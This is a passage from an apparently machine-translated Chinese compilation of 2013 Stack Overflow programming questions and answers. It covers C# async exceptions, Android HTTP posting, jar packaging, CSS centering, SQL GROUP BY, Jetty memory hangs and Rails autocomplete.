items[0].id = 1
items[0].count = 1
items[1].id = 2
items[1].count = 2

# category 2
items[0].id = 3
items[0].count = 1
items[1].id = 4
items[1].count = 5 
```

它是导致值被覆盖的原因。我需要我的索引在表单中是连续的，如下所示：

```
# category 1
items[0].id = 1
items[0].count = 1
items[1].id = 2
items[1].count = 2

# category 2
items[2].id = 3
items[2].count = 1
items[3].id = 4
items[3].count = 5 
```

# 所以有问题

对于函数式程序员：

*   我可以为所有组共享索引变量吗？

对于 Play 2.0 或网络程序员：

*   有没有另一种方法来制作具有可变重复值计数的表格？
*   如何避免发送这一堆计数为 0 的物品？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:33:02.113

我没有玩游戏的经验，所以我无法评论 Play 的具体问题（也许它已经为你想要的东西提供了帮助），但仅在 scala librayr 上你可以做这样的事情：

```
@items.sortBy(item => item.category).zipWithIndex.groupBy{ case (item, _) => item.category}.map {
  case (categoryId, indexedItemsInCategory) =>
    <table>
      @indexedItemsInCategory.map {
        case (item, index) =>
          @itemRow(item, index)
      }
    </table>
} 
```

这个想法是首先按类别对项目进行排序，然后将它们与相应的索引一起压缩。然后只有你按类别对它们进行分组（这应该很快，因为列表已经排序）。

# c# - 如何从异步方法向调用者抛出异常？

> ID：14379845
> 
> 赞同：8
> 
> 时间：2013-01-17T13:09:04.810
> 
> 标签：c#, .net, exception-handling, async-await

今天我读了很多关于 async/await 的内容，这让我大吃一惊。我不明白为什么以下测试通过了。

```
[Test]
public void Test()
{
    var listener = new AsyncHttpListener();
    listener.ListeningAsync();

    try
    {
        new WebClient().DownloadString("http://localhost:8080/");
    }
    catch (Exception)
    {
    }

    listener.Close();
}

public class AsyncHttpListener
{
    private readonly HttpListener listener;

    public AsyncHttpListener()
    {
        listener = new HttpListener();
        listener.Prefixes.Add("http://localhost:8080/");
        listener.Start();
    }

    public void Close()
    {
        listener.Close();
    }

    public async void ListeningAsync()
    {
        var context = await listener.GetContextAsync();
        HandleContext(context);
    }

    private void HandleContext(HttpListenerContext context)
    {
        throw new Exception("test excpetion");
    }
} 
```

测试通过，但输出包含：

```
系统异常
考试成绩
   在 AsyncHttpListener.cs 中的 AsyncHttpListenerTest.AsyncHttpListener.HandleContext(HttpListenerContext context)：第 30 行
   在 AsyncHttpListener.cs 中的 AsyncHttpListenerTest.AsyncHttpListener.d__0.MoveNext()：第 25 行
--- 从先前抛出异常的位置结束堆栈跟踪 ---
   在 System.Runtime.CompilerServices.AsyncMethodBuilderCore.b__1（对象状态）
   在 System.Threading.ExecutionContext.RunInternal（ExecutionContext executionContext，ContextCallback 回调，对象状态，布尔值 preserveSyncCtx）
   在 System.Threading.ExecutionContext.Run（ExecutionContext executionContext，ContextCallback 回调，对象状态，布尔值 preserveSyncCtx）
   在 System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem()
   在 System.Threading.ThreadPoolWorkQueue.Dispatch()

```

我希望异常会从任务线程（HandleContext() 方法）传输到调用者上下文并且测试失败。我怎样才能得到这种行为？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-17T13:25:31.883

用你的方法`async Task`代替`async void`，用你的测试方法`async Task`代替`void`：

```
public async Task ListeningAsync()
{
    var context = await listener.GetContextAsync();
    HandleContext(context);
}

[Test]
public async Task Test()
{
    var listener = new AsyncHttpListener();
    await listener.ListeningAsync();

    try
    {
        new WebClient().DownloadString("http://localhost:8080/");
    }
    catch (Exception)
    {
    }

    listener.Close();
} 
```

有几个很好的理由可以避免`async void`。错误处理就是其中之一。方法引发的错误`async void`直接指向`SynchronizationContext`方法启动时的错误。

您的测试通过的原因是`async`方法可能在完成之前返回给调用者。测试运行程序看到测试方法返回（还没有抛出异常），并将其标记为“通过”。如果你从你的测试方法返回，那么测试运行者知道在考虑测试完成之前`Task`等待完成。`Task`

# android - 收到错误“无法从 HttpEntityEnclosureRequestBase 类型对非静态方法 setEntity(HttpEntity) 进行静态引用”

> ID：14379848
> 
> 赞同：0
> 
> 时间：2013-01-17T13:09:09.410
> 
> 标签：android, spreadsheet, http-request

我正在创建一个 android 应用程序的活动，用户在其中填写他的详细信息（由 id 的名称、bhawan、房间、手机、书籍等标识），这些值将直接传输到 Google 电子表格。它给了我那个奇怪的错误。你能帮我吗 ？提前致谢。

```
public class MainActivity extends Activity {

    final EditText nameField = (EditText) findViewById(R.id.EditTextName);  
    String name = nameField.getText().toString(); 

    final EditText bhawanField = (EditText) findViewById(R.id.EditTextBhawan);  
    String bhawan = bhawanField.getText().toString();

    final EditText roomField = (EditText) findViewById(R.id.EditTextRoom);  
    String room = roomField.getText().toString();

    final EditText mobileField = (EditText) findViewById(R.id.EditTextPhone);  
    String mobile = mobileField.getText().toString();

    final EditText emailField = (EditText) findViewById(R.id.EditTextEmail);  
    String email = emailField.getText().toString();

    final EditText bookField = (EditText) findViewById(R.id.EditTextBook);  
    String book = bookField.getText().toString();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);         

        Button sendButton = (Button) findViewById(R.id.ButtonSubmit);
        sendButton.setOnClickListener(new OnClickListener() {           
            public void onClick(View v) {
                btn_Click();
            }}
        );
    }   

    public void btn_Click(){
         SendHttpRequset();       
    }

     public void SendHttpRequset(){
         HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost("https://spreadsheets.google.com/spreadsheet/formResponse?hl=en_US&amp;formkey=dDlwZzh4bGFvNFBxUmRsR0d2VTVhYnc6MQ&amp;ifq");

            List<BasicNameValuePair> results = new ArrayList<BasicNameValuePair>(6);
            results.add(new BasicNameValuePair("entry.0.single", name));
            results.add(new BasicNameValuePair("entry.1.single", bhawan));
            results.add(new BasicNameValuePair("entry.2.single", room));
            results.add(new BasicNameValuePair("entry.4.single", mobile));
            results.add(new BasicNameValuePair("entry.6.single", email));
            results.add(new BasicNameValuePair("entry.8.single", book));

            try {
                HttpPost.setEntity(new UrlEncodedFormEntity(results));
            }
            catch (UnsupportedEncodingException e) {
                // writing error to Log
                e.printStackTrace();
            }

            // Making HTTP Request
            try {
                HttpResponse response = HttpClient.execute(post);

                // writing response to log
                Log.d("Http Response:", response.toString());

            } catch (ClientProtocolException e) {
                // writing exception to log
                e.printStackTrace();

            } catch (IOException e) {
                // writing exception to log
                e.printStackTrace();
            }
     }

    /*public void submitDetails() {
        HttpClient client = new DefaultHttpClient();
        HttpPost post = new HttpPost("https://spreadsheets.google.com/spreadsheet/formResponse?hl=en_US&amp;formkey=dDlwZzh4bGFvNFBxUmRsR0d2VTVhYnc6MQ&amp;ifq");

        List<BasicNameValuePair> results = new ArrayList<BasicNameValuePair>(6);
        results.add(new BasicNameValuePair("entry.0.single", name));
        results.add(new BasicNameValuePair("entry.1.single", bhawan));
        results.add(new BasicNameValuePair("entry.2.single", room));
        results.add(new BasicNameValuePair("entry.4.single", mobile));
        results.add(new BasicNameValuePair("entry.6.single", email));
        results.add(new BasicNameValuePair("entry.8.single", book));

        try {
            HttpPost.setEntity(new UrlEncodedFormEntity(results));
        }
        catch (UnsupportedEncodingException e) {
            // writing error to Log
            e.printStackTrace();
        }

        // Making HTTP Request
        try {
            HttpResponse response = HttpClient.execute(post);

            // writing response to log
            Log.d("Http Response:", response.toString());

        } catch (ClientProtocolException e) {
            // writing exception to log
            e.printStackTrace();

        } catch (IOException e) {
            // writing exception to log
            e.printStackTrace();
        }
    }*/
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:11:01.703

尝试改变：

```
HttpPost.setEntity(new UrlEncodedFormEntity(results)); 
```

至

```
post.setEntity(new UrlEncodedFormEntity(results)); 
```

您之前以调用静态函数的方式调用 setEntity()，但它不是静态方法。您可能打算使用`post`您之前创建的对象来调用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:15:12.817

HttpPost 是一个静态类，但 setEntity() 是一个非静态方法。要调用非静态方法，您需要使用`new`关键字或该类提供的其他方法实例化该类的一个实例，例如myHttpPost。

# events - 经典 ASP 中的事件句柄

> ID：14379851
> 
> 赞同：0
> 
> 时间：2013-01-17T13:09:18.673
> 
> 标签：events, asp-classic

我正在使用 ChartFX 在经典 ASP 页面中创建图表。

我需要在我的图表对象（服务器端）上捕获事件“GetPointLabel”，但我无法做到......这是我的代码（不起作用：该函数永远不会被触发）：

> Private Sub Chart1_GetPointLabel(ByVal sender, ByVal args) '一些处理代码 End Sub

这是在经典 ASP 中处理事件的正确方法吗？

谢谢，尼古拉斯

# javascript - tinyhippo 注入脚本的目的是什么？

> ID：14379856
> 
> 赞同：82
> 
> 时间：2013-01-17T13:09:38.547
> 
> 标签：javascript, google-chrome

我注意到谷歌浏览器在`<head>`我加载的任何 Web 文档的标记之前附加了一个小 JS 脚本（如果你使用检查元素查看 HTML 代码，你会注意到）：

```
<script id="tinyhippos-injected">
   if (window.top.ripple) { window.top.ripple("bootstrap").inject(window, document);
</script> 
```

出于好奇，它有什么作用？谷歌搜索没有帮助。

* * *

## 回答 #1

> 赞同：142
> 
> 时间：2013-01-17T13:12:58.413

我相信您已经安装了添加此脚本的[Ripple Emulator (Beta)](https://chrome.google.com/webstore/detail/ripple-emulator-beta/geelfhphabnejjhdalkjhgipohgpdnoc)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-06-11T09:36:41.487

如果启用，此脚本由 Ripple Emulator(Beta) chrome 扩展插入。[![Chrome 商店图片](../Images/4a75763a58928736a181af9da99de475.png)](https://i.stack.imgur.com/nXQQa.jpg)

理想情况下，可以通过打开 Ripple Mission Control 来禁用它，但它不会这样做。 [![瑞波任务控制](../Images/d9ef509bfa431b3e7f68592ef279f072.png)](https://i.stack.imgur.com/Iolf3.jpg)

要确定禁用它，您必须从 chrome://extensions/ 禁用 Ripple Emulator(Beta) [![在此处输入图像描述](../Images/69d52bd8bcc7a4e6b71d9ed7009fe624.png)](https://i.stack.imgur.com/4bUjF.jpg)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-17T13:12:26.463

进一步研究后，请看这个问题。

[JS 和 Wordpress 中未捕获的 SyntaxError](https://stackoverflow.com/questions/11691455/uncaught-syntaxerror-in-js-and-possibly-wordpress)

它是黑莓模拟器。

# java - 无法导入jar文件

> ID：14379858
> 
> 赞同：1
> 
> 时间：2013-01-17T13:09:42.417
> 
> 标签：java, import, jar

我使用这个 cmd 行创建了一个包含三个类的 jar 文件：

```
C:\...\db>jar cvf views.jar Line.java Points.java Shapes.java 
```

我可以将 jar 文件添加到 IDE，但无法将其导入代码。

另一件事是 jar 文件中的类是`xxx.java`，但是当查看另一个 jar 文件时，我注意到这些类是`xxx.class`

我不知道这是否是问题所在。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:12:31.000

Jar 只不过是归档（压缩）

您显然正在将`.java`文件压缩到您的`jar`文件中。

首先`.java`使用编译文件`javac`

而不是对生成的文件发出`jar`命令 `.class`

请参阅[如何创建 Jar](http://docs.oracle.com/javase/tutorial/deployment/jar/build.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T13:13:37.717

在创建 JAR 文件而不是源 .java 文件时，您应该参考 .class 文件。

[在这里](http://docs.oracle.com/javase/tutorial/deployment/jar/build.html)，您可以找到有关从 Oracle 官方网站创建 JAR 的教程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:12:59.370

`jar`是一个归档工具，它只是打包你编译的java文件。这意味着您应该首先编译这些 .java 文件，然后将生成的 .class 文件添加到 jar 中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T13:13:33.467

我通常希望`.jar`文件包含类而不是`.java`文件（或者至少源可以在类旁边）

您可以将任何内容压缩到`.jar`文件中（它是`.zip`另一个名称 - 请参阅[此处了解更多信息](http://docs.oracle.com/javase/7/docs/technotes/guides/jar/jar.html)），但我怀疑 IDE 需要`.class`文件。请注意，我的 IDE (Intellij) 允许我指定包含源的 jar/zip，但这通常与包含已编译代码的 jar 并排。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-17T13:14:47.213

您在 jar 中打包 java 源文件而不是已编译的类文件。如果你想让你的 jar 在 IDE 中使用，你应该打包类文件。就像是

```
C:\...\db>javac Line.java Points.java Shapes.java 
```

进而

```
C:\...\db>jar cvf views.jar Line.class Points.class Shapes.class 
```

# php - 解决“连接超时”错误后出现“无法发送会话缓存限制器 - 标头已发送”错误

> ID：14379859
> 
> 赞同：0
> 
> 时间：2013-01-17T13:09:44.137
> 
> 标签：php, facebook-graph-api, curl, facebook-php-sdk

在我的应用程序中，CURL 超时并因此导致错误：

```
CurlException: 28: Connection time-out 
```

所以，我增加了from to的`CURLOPT_CONNECTTIMEOUT`值。在那之后，错误就消失了，但又出现了新的错误：`base_facebook.php``10``30``Connection time-out`

```
Cannot send session cache limiter - headers already sent 
```

`facebook.php`它指示错误的行位于代码所在的文件中的49处`session_start();`。

当我将 CURL 超时值改回 10 或 15 时，此会话缓存错误就会消失。但是超时错误又回来了！

我正在使用最新的 PHP SDK（两天前最后一次更新）。

以下是当前 CURL 选项`base_facebook.php`：

```
CURLOPT_CONNECTTIMEOUT => 10,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT        => 60,
CURLOPT_USERAGENT      => 'facebook-php-3.2', 
```

关于如何解决此问题的任何想法/建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:14:08.553

**当您使用 php 重定向时，通常会发生**标头已发送错误。**如果您使用 php 重定向，请使用 javascript 重定向而不是。**

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:19:04.523

确保您的文件在没有 BOM 编码的情况下保存，尤其是给您`headers already sent`错误的那个。

我以前遇到过这个问题 - 即使我没有输出任何内容，文件中也有额外的字符。**

# android - Android RTP API 级别 8

> ID：14379862
> 
> 赞同：0
> 
> 时间：2013-01-17T13:09:48.707
> 
> 标签：android, rtp

我必须在 API 级别 8 的 Android 上实现相机共享。我以 YUV 格式获取图像数据并将它们压缩为 jpg。现在我必须通过网络发送这些图像。由于这应该是实时摄像机视图，因此我想使用 UDP 数据包来发送数据。可悲的是，这些包裹太大而无法发送。另一个想法是通过 RTP 发送这些数据包，现在我在 Android 上遇到了 RTP 的问题。我发现 JMF 支持 RTP，但似乎没有办法将 JMF 移植到 android。

有没有人可以给我一个提示我如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-02T11:39:09.377

现在我找到了一个适合我的解决方案。我使用 KryoNet 库通过 UDP 将图像数据发送到客户端。jLibRTP 仅支持小于 1,5kb 的包，对于图像来说太小了。

也许这对某人有帮助。

# css - 如何使用 CSS 居中此菜单

> ID：14379879
> 
> 赞同：2
> 
> 时间：2013-01-17T13:11:11.217
> 
> 标签：css

我已经修复了这个菜单，如何使这个菜单居中？
我已经尝试使用 margin: 0 auto 和 float: left，但它不起作用。
有什么办法可以居中吗？？
这里我有一个演示：

[http://jsbin.com/enaliw/3/edit](http://jsbin.com/enaliw/3/edit)

```
<nav>
        <ul id="main-nav" class="clearfix">
            <li><a href="#;">Inicio</a></li>
            <li><a href="#">Guia</a></li>
            <li><a href="#">Heroes</a></li>
            <li><a href="#">Videos</a></li>
            <li><a href="#">ScreamShots</a></li>
        </ul>
    </nav> 
```

CSS

```
#main-nav {

width: 100%;
margin: 0 auto;
padding: 0;
position: fixed;
left: 0;
/*bottom: 0;*/
z-index: 100;
background: #9dd53a; /* Old browsers */
background: -moz-linear-gradient(top, #9dd53a 26%, #a1d54f 47%, #80c217 67%, #7cbc0a 100%); /* FF3.6+ */
background: -webkit-gradient(linear, left top, left bottom, color-stop(26%,#9dd53a), color-stop(47%,#a1d54f), color-stop(67%,#80c217), color-stop(100%,#7cbc0a)); /* Chrome,Safari4+ */
background: -webkit-linear-gradient(top, #9dd53a 26%,#a1d54f 47%,#80c217 67%,#7cbc0a 100%); /* Chrome10+,Safari5.1+ */
background: -o-linear-gradient(top, #9dd53a 26%,#a1d54f 47%,#80c217 67%,#7cbc0a 100%); /* Opera 11.10+ */
background: -ms-linear-gradient(top, #9dd53a 26%,#a1d54f 47%,#80c217 67%,#7cbc0a 100%); /* IE10+ */
background: linear-gradient(to bottom, #9dd53a 26%,#a1d54f 47%,#80c217 67%,#7cbc0a 100%); /* W3C */
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#9dd53a', endColorstr='#7cbc0a',GradientType=0 ); /* IE6-9 */
border-radius: 8px;}

#main-nav li {
position: relative;
margin: 0 auto;
padding: 0;
list-style: none;
float: left;}

#main-nav a {
margin: 0 auto;
line-height: 100%;
font-weight: bolder;
color: #000000;
display: block;
padding: 15px 20px;
text-decoration: none;} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:15:33.303

您可以将`#mainnav li`as 从更改`float: left;`为`display: inline-block;`

```
#main-nav li {
    position: relative;
    margin: 0 auto;
    padding: 0;
    list-style: none;
    display: inline-block;
} 
```

然后你可以使用 text-align: center; 在 ul。

```
#main-nav {
...
     text-align: center;
...
} 
```

工作演示：http: [//jsfiddle.net/rSc9s/](http://jsfiddle.net/rSc9s/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:25:00.253

要使其垂直居中，需要从**#main-nav li中删除****显示**

 **```
#main-nav li {
    position: relative;
    margin: 0 auto;
    padding: 0;
    list-style: none;
} 
```

添加文本对齐：居中；在**#main-nav**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:24:20.573

```
#main-nav { list-style: none outside; text-align: center; }

#main-nav li { display: inline; }

#main-nav li a { display: inline-block; } 
```

我想这就是你要找的

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-30T23:23:27.043

试试这个：

```
<style>
#main-nav li {
    margin: 0 auto;
    padding: 0;
    list-style: none;
    display: inline-block;
    position: relative;
}
</style> 
```**

# android - 如何检测用户是否错过了android中GRoute绘制的路径

> ID：14379880
> 
> 赞同：1
> 
> 时间：2013-01-17T13:11:15.713
> 
> 标签：android, routes

我已经使用 Groute url 在画布上的两个地理点之间绘制了一条路径，现在我想知道用户是在绘制的路径上还是错过了它。我没有找到任何解决方案，请建议我。

这是我在两个位置之间找到地理点的网址（http://maps.googleapis.com/maps/api/directions/xml?origin=52.31,16.71&destination=51.27,6.75&sensor=false）

这是我的代码，我已经绘制了我的路线。

```
 private void fetchData()
{
    StringBuilder urlString = new StringBuilder();
    urlString.append("http://maps.google.com/maps/api/directions/xml?origin=");
    urlString.append( Double.toString((double)srcGeoPoint.getLatitudeE6()/1.0E6 )); 
    urlString.append(","); 
    urlString.append( Double.toString((double)srcGeoPoint.getLongitudeE6()/1.0E6 )); 
    urlString.append("&destination=");//to 
    urlString.append( Double.toString((double)destGeoPoint.getLatitudeE6()/1.0E6 )); 
    urlString.append(","); 
    urlString.append( Double.toString((double)destGeoPoint.getLongitudeE6()/1.0E6 )); 
    urlString.append("&sensor=true&mode=driving");     
    Log.d("url","::"+urlString.toString());
    HttpURLConnection urlConnection= null; 
    URL url = null; 
    try 
    { 
        url = new URL(urlString.toString()); 
        urlConnection=(HttpURLConnection)url.openConnection(); 
        urlConnection.setRequestMethod("GET"); 
        urlConnection.setDoOutput(true); 
        urlConnection.setDoInput(true); 
        urlConnection.connect(); 
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); 
        DocumentBuilder db = dbf.newDocumentBuilder();
        doc = (Document) db.parse(urlConnection.getInputStream());//Util.XMLfromString(response);
    }catch (MalformedURLException e){ 
        e.printStackTrace(); 
    }catch (IOException e){ 
        e.printStackTrace(); 
    }catch (ParserConfigurationException e){ 
        e.printStackTrace(); 
    }
    catch (SAXException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}

    private List<GeoPoint> decodePoly(String encoded) {

    List<GeoPoint> poly = new ArrayList<GeoPoint>();
    int index = 0, len = encoded.length();
    int lat = 0, lng = 0;

    while (index < len) {
        int b, shift = 0, result = 0;
        do {
            b = encoded.charAt(index++) - 63;
            result |= (b & 0x1f) << shift;
            shift += 5;
        } while (b >= 0x20);
        int dlat = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
        lat += dlat;

        shift = 0;
        result = 0;
        do {
            b = encoded.charAt(index++) - 63;
            result |= (b & 0x1f) << shift;
            shift += 5;
        } while (b >= 0x20);
        int dlng = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
        lng += dlng;

        GeoPoint p = new GeoPoint((int) (((double) lat / 1E5) * 1E6),
                (int) (((double) lng / 1E5) * 1E6));
        System.out.println("geopoints = " +p);
        poly.add(p);
    }

    return poly;
} 
```

提前致谢

# sql - INNER JOIN & MAX 问题

> ID：14379883
> 
> 赞同：0
> 
> 时间：2013-01-17T13:11:22.833
> 
> 标签：sql, ms-access, inner-join

我有下表，我们在其中存储项目计划：

```
ID    PROJECT_NAME   MILESTONE_NAME 
```

所有里程碑都以数字开头，例如“0.1 - 里程碑描述”。

我想检索按项目订购的 MAX MILESTONE_NAME。

我使用了以下代码，但它不起作用......

```
SELECT Sheet1.[PROJECT_NAME], MAX(Sheet1.[MILESTONE_NAME])
FROM Sheet1 INNER JOIN Sheet1 AS Sheet1_1 ON (Sheet1.[PROJECT_NAME] = Sheet1_1.[PROJECT_NAME]) AND (Sheet1.[MILESTONE_NAME] = Sheet1_1.[MILESTONE_NAME])
ORDER BY Sheet1.[PROJECT_NAME] 
```

它说 PROJECT_NAME 不在聚合函数中。

你们知道我应该如何前进吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:12:52.587

你必须`GROUP BY Sheet1.[PROJECT_NAME]`。

尝试 ：

```
SELECT Sheet1.[PROJECT_NAME], MAX(Sheet1.[MILESTONE_NAME])
FROM Sheet1
    INNER JOIN Sheet1 AS Sheet1_1 ON (Sheet1.[PROJECT_NAME] = Sheet1_1.[PROJECT_NAME])
        AND (Sheet1.[MILESTONE_NAME] = Sheet1_1.[MILESTONE_NAME])
GROUP BY Sheet1.[PROJECT_NAME]
ORDER BY Sheet1.[PROJECT_NAME] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:13:08.017

添加到查询：

```
GROUP BY Sheet1.[PROJECT_NAME]; 
```

# java - Jetty 服务器挂起大型对象池而没有发出任何请求

> ID：14379888
> 
> 赞同：4
> 
> 时间：2013-01-17T13:11:41.813
> 
> 标签：java, garbage-collection, jetty, pool

我正在使用带有 maven 的码头服务器运行 Web 应用程序。*该应用程序在列表*和*映射*中包含大量静态对象，导致 2.8GB 的​​物理内存使用量。几个小时后，服务器以最大 CPU 使用率挂起。这发生在没有任何用户交互或在服务器上发出请求的情况下。

我注意到在这几个小时内，虽然服务器运行良好，但内存慢慢减少到 1.7GB。我怀疑这可能是与垃圾收集相关的问题。

**问题：**

1.  可能是 GC 在错误地收集或检查我的大型对象池及其引用时挂起？
2.  我将如何调试和解决这个问题？

请注意，在 Windows 上我没有这个问题。一旦应用程序启动并填满它的池，它会占用 3.4GB 并保持完全相同而不会崩溃。

**服务器启动及环境：**

```
setenforce 0
export MAVEN_OPTS="-Xmx5120m -Xms5120m -XX:+UseConcMarkSweepGC -Xgcthreads1 -XX:MaxGCPauseMillis=2000 -XX:GCTimeRatio=10"
sudo nohup mvn -D jetty.port=80 jetty:run & 
```

**操作系统：**

```
Ubuntu 12.04.1 LTS 
```

**爪哇：**

```
OpenJDK Runtime Environment (IcedTea6 1.11.5) (6b24-1.11.5-0ubuntu1~12.04.1)
OpenJDK 64-Bit Server VM (build 20.0-b12, mixed mode) 
```

**马文：**

```
Apache Maven 3.0.4 
```

**码头：**

```
8.1.8.v20121106 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:46:55.543

很难说是不是因为不正确的 GC 导致了系统挂起。我认为您可以采取一些措施来获取更多信息：

1.  添加`-verbose:gc -Xloggc:/home/admin/logs/gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps`到您的**JVM 参数**中，这些将帮助您找到更多关于 GC 的信息。
2.  定期收集**线程转储**以查看应用程序在运行时发生的情况。
3.  机器快要死机时获取**内存转储，可以通过MAT分析。**
4.  当 CPU 达到峰值时，使用`top -H -p<pid>`找到**支配线程**并在线程转储中发现它们，然后您基本上可以找出哪一行代码做错了。

这是一篇非常好的文章[How to Analyze Java Thread Dumps](http://www.cubrid.org/blog/dev-platform/how-to-analyze-java-thread-dumps/)。

# c# - 优化：局部变量还是全局变量？

> ID：14379892
> 
> 赞同：0
> 
> 时间：2013-01-17T13:11:49.057
> 
> 标签：c#, linq, silverlight, optimization

我正在开发一个 Silverlight 应用程序 (C#)，我在其中使用自定义控件`Square`和以下全局变量。

```
Square[,] arrSquare = new Square[customRows,customColumns]
List<Square> lstSelection;
List<Square> lstEditable;
List<Square> lstSetSquares;
List<Square> lstCancelled; 
```

这些列表一次又一次地用于更新目的。`arrSquare`只有当我必须更新我上面的隔离列表时才会出现。

我有两个选择：

1.  遵循我当前的架构，即拥有全局变量并且不`arrSquare`经常使用我的主数组

2.  在方法中使用`LINQ`（`arrSquare`转换为本地声明`List`的s）以便在方法完成时破坏本地对象？

如果有更好的方法，请提出。请注意，我将要处理的数据将是巨大的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:15:49.820

问题不应该是关于全局变量和局部变量的问题，而应该表述为“保留计算的缓存副本还是根据需要在现场生成它们更好？”。

由于您的数据集将很大，因此显然无法按需执行所有计算，因此该问题很容易回答。

# html - 如何让嵌入阴影在 IE9 中工作？

> ID：14379893
> 
> 赞同：2
> 
> 时间：2013-01-17T13:12:02.550
> 
> 标签：html, internet-explorer, cross-browser, css

我从这里的一个答案中得到了说明，并得到了插入框阴影来处理身体标签。

这是现场示例： http: [//nemokamamuzika.lt](http://nemokamamuzika.lt)

这是我闲置的代码：

```
html, body { 
    width:100%;
    height: 100%;
}

body {
    box-shadow: inset 0 0 1000px 30px black;
    background: url('http://osxdaily.com/wp-content/uploads/2011/08/apple-shirt.jpg');
} 
```

但是....它在“喜爱的”浏览器 Internet Explorer 9 中不起作用...

**Finnaly 自己解决了问题。如果有人需要解决方案：**

这是html：

```
<body>
<div id="shadow">
<div id="padding">
<div id="content">
</div></div></div></body> 
```

这是CSS：

```
html { 
    height: 100%;
}

body {
  height:100%;
  min-height: 100%;
  background-image: url('/wp-content/uploads/someimage.jpg');
  background-attachment: scroll;
  background-repeat: repeat;
}

#shadow {
  width: 100%;
  min-height: 100%;
  margin: 0 auto;
  box-shadow: inset 0 0 400px 50px black;
}

#padding{
  width: 100%;
  min-height: 100%;
  margin: 0 auto;
  padding: 30px 0 30px 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T20:46:24.167

诀窍是将背景图像放入 html 标记中。

这个 css3 示例将为您提供一个很好的褪色背景下拉效果，否则即使在 css3 浏览器中也经常使用 24 位 png 图像创建 - 但是，这更容易。IE9、Firefox、Safari（适用于 Windows）中的 Testet。

在这里测试和尝试：http: [//jsfiddle.net/LUDJF/](http://jsfiddle.net/LUDJF/)

```
html {
        width:100%;
        height:100%;
        background:url('http://www.sequelsite.dk/mediafiles/sequelsite/white-grid-paper-background-pattern.jpg');
}

body {
        margin:0;
        padding:0;
        width:100%;
        height:100%;
        box-shadow  : inset 0px 3000px 200px -2800px rgba(255,0,0,0.5);
        -webkit-box-shadow: inset 0px 3000px 3000px -2800px rgba(255,0,0,0.5);
        -moz-box-shadow : inset 0px 3000px 200px -2800px rgba(255,0,0,0.5);
        -o-box-shadow   : inset 0px 3000px 200px -2800px rgba(255,0,0,0.5);
} 
```

# android - 如何从任何活动屏幕获取选定的文本

> ID：14379895
> 
> 赞同：0
> 
> 时间：2013-01-17T13:12:15.123
> 
> 标签：android, android-intent

考虑任何应用程序正在运行的场景，并且用户在该应用程序的活动屏幕上选择了一些文本。我想通过在后台运行的服务获取选定的文本并在服务中处理该文本。可以从任何应用程序（如 SMS、浏览器或任何地方的联系人）中选择文本。

谁能告诉我获取文本的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:19:03.520

您无法抓取选定的文本，但我认为在剪贴板中复制的文本是可能的。

见[http://developer.android.com/reference/android/content/ClipboardManager.html](http://developer.android.com/reference/android/content/ClipboardManager.html)和getPrimaryClip()

# ruby-on-rails-3 - rails 3.2 jquery自动完成最小长度

> ID：14379896
> 
> 赞同：1
> 
> 时间：2013-01-17T13:12:15.670
> 
> 标签：ruby-on-rails-3, jquery-ui, autocomplete, ruby-on-rails-3.2

我按照说明在 rails 3.2.11 应用程序中实现自动完成，但我需要在查询触发之前指定要键入的最少字符数。jQuery API 文档有一个属性“minLength”。我不知道如何在 rails 自动完成字段标签中实现这一点。这是我的字段标签代码。

```
<%= autocomplete_field_tag 'unit', '', autocomplete_unit_identifier_subjects_path, :id_element => '#subject_id', :size => 75 %> 
```

这是我正在遵循的说明的网址。 [https://github.com/crowdint/rails3-jquery-autocomplete](https://github.com/crowdint/rails3-jquery-autocomplete)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-10-06T23:10:36.057

如果有人正在寻找更新的答案，您现在可以使用属性“min-length”设置最小长度。

```
<%= autocomplete_field_tag 'group_name', '', group_autocomplete_path, 'placeholder' => 'Select a Job Number', 'size' => 35, 'class' => 'styled-select', 'data-auto-focus' => true, 'min-length' => 1 %> 
```

为什么它不是 jQuery 自动完成中记录的“最小长度”，我不知道..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T14:39:21.003

好吧，minLength 不起作用，因为 autocomplete-rails.js 中的这段代码，第 65 行左右：

```
 search: function() {
      // custom minLength
